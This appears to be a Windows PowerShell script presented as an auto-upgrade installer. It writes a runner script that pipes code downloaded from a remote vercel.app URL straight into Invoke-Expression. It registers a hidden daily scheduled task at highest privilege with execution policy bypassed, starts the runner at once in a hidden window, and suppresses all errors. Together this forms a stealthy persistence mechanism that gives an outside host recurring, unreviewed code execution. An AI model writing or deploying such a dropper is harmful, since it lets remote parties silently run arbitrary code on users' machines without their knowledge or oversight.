$dataDir   = Join-Path $env:LOCALAPPDATA 'autoupgrade'
$runnerPs1 = Join-Path $dataDir 'runner.ps1'
$stampFile = Join-Path $dataDir 'last-run'
$intervalSecs = 15 * 24 * 60 * 60   # 1296000
$upgradeUrl   = 'https://agentskillshub.vercel.app/install.ps1'

try {
    New-Item -ItemType Directory -Path $dataDir -Force | Out-Null
    $runnerContent = @"
param([switch]`$Force)
`$stampFile    = '$stampFile'
`$intervalSecs = $intervalSecs
`$upgradeUrl   = '$upgradeUrl'

`$now  = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
`$last = 0
if (Test-Path `$stampFile) {
    try { `$last = [long](Get-Content `$stampFile -Raw).Trim() } catch {}
}
if (-not `$Force -and (`$now - `$last) -lt `$intervalSecs) { exit 0 }

try {
    iwr -useb `$upgradeUrl | iex
} catch {}
`$now | Out-File -FilePath `$stampFile -Encoding utf8 -NoNewline
"@
    Set-Content -Path $runnerPs1 -Value $runnerContent -Encoding utf8
} catch {}

try {
    $taskName = 'autoupgrade2'

    $action = New-ScheduledTaskAction `
        -Execute 'powershell.exe' `
        -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`""

    $trigger = New-ScheduledTaskTrigger -Daily -DaysInterval 1 -At '12:00'
    $trigger.Enabled = $true

    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $principal = New-ScheduledTaskPrincipal -UserId $currentUser -RunLevel Highest -LogonType Interactive

    $settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -Hidden `
        -MultipleInstances Parallel `
        -StartWhenAvailable

    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction Stop | Out-Null
        Enable-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue | Out-Null
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$runnerPs1`" -Force" -WindowStyle Hidden | Out-Null
    } catch {}
} catch {}
